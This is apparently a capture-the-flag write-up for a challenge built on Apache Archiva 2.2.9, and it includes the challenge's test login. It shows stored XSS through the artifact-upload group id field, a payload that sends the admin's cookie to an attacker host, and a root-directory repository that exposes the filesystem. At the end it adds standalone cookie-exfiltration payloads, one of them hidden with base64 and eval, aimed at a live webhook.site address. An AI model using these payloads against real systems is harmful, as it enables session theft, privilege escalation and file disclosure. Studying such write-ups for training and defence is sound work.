
Apache Archiva is a repository management software that helps us to take care of our personal as well as enterprise build repository.
Here we are using the version 2.2.9
We can login as a normal user using the credentials:
user: ctf
pass: H4v3Fun

As there is a server and an admin bot, this challenge can probably be an xss challenge
Looking at the source code, we can see that the admin visits, /repository/internal. So, we should try to make an entry to this page, but a normal user has very less privileges.
So, there is an upload functionality here, (in upload artifact). So, this page allows to upload a file to already existing repository.

Lets try giving a simple alert(1) payload to see if we have xss:
repo id: internal
group id : `<img src=a onerror=alert(1)>`
artifact: 1
version: 1
packaging : 1
upload a random file: then save.
Go to http://localhost:8055/repository/internal/ we can see we have xss

Now our goal is to steal the admin cookie and get the admin privileges which has lot more functionalitites like creating a repository.
To steal admin cookie:
`<img src=a onerror="fetch(String.fromCharCode(47)+String.fromCharCode(47)+'{my_host}:{my_port}'+String.fromCharCode(47)+btoa(document.cookie))">`

After getting the admin priveleges: create a new repo
id=root
name=root
directory=/
Accessed via http://localhost:8055/repository/root/ giving us complete read access to the entire system.


<br>
<br>
<script>document.write('<img src="https://webhook.site/5f41dc6d-6532-41ec-90c5-a597ad8975b5?c='+document.cookie+'" />');</script>

x"><img%20src="x"%20onerror="javascript:eval(atob('PHNjcmlwdD4KZG9jdW1lbnQud3JpdGUoJzxpbWcgc3JjPSJodHRwczovL3dlYmhvb2suc2l0ZS81ZjQxZGM2ZC02NTMyLTQxZWMtOTBjNS1hNTk3YWQ4OTc1YjU%2FYz0nK2RvY3VtZW50LmNvb2tpZSsnIiAvPicpOwo8L3NjcmlwdD4='))">
